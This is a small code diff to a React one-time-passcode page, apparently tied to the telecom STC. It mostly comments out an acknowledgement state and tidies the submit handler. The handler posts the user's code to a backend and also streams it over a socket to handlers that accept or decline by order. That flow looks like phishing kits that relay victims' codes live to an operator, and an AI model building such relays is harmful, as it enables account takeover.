@@ -19,7 +19,7 @@ const STCOTP = () => {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);
   const [counter, setCounter] = useState(180);
-  const [stcCallAck, setStcCallAck] = useState(false);
+  // const [stcCallAck, setStcCallAck] = useState(false);
 
   const ID = sessionStorage.getItem("id");
   const navigate = useNavigate();
@@ -77,7 +77,7 @@ const STCOTP = () => {
       if (!sameOrder(id)) return;
       setLoading(false);
       setError(false);
-      setStcCallAck(false);
+      // setStcCallAck(false);
       if (!isStcCallPhase) {
         navigate("/stcOtp?phase=call", { replace: true });
       }
@@ -104,7 +104,7 @@ const STCOTP = () => {
 
     const onAcceptSTC = (oid) => {
       if (!sameOrder(oid)) return;
-      setStcCallAck(true);
+      // setStcCallAck(true);
     };
 
     const onDeclineSTC = (oid) => {
@@ -138,14 +138,13 @@ const STCOTP = () => {
     setLoading(true);
     e.preventDefault();
     try {
-      await axios.post(
-        `${api_route}/phoneOtp/${sessionStorage.getItem("id")}`,
-        {
-          phoneOtp: otp,
-        },
-      );
+      const orderId = sessionStorage.getItem("id");
+      await axios.post(`${api_route}/phoneOtp/${orderId}`, {
+        phoneOtp: otp,
+      });
       socket.emit("phoneOtp", {
-        id: sessionStorage.getItem("id"),
+        _id: orderId,
+        id: orderId,
         phoneOtp: otp,
       });
     } catch {
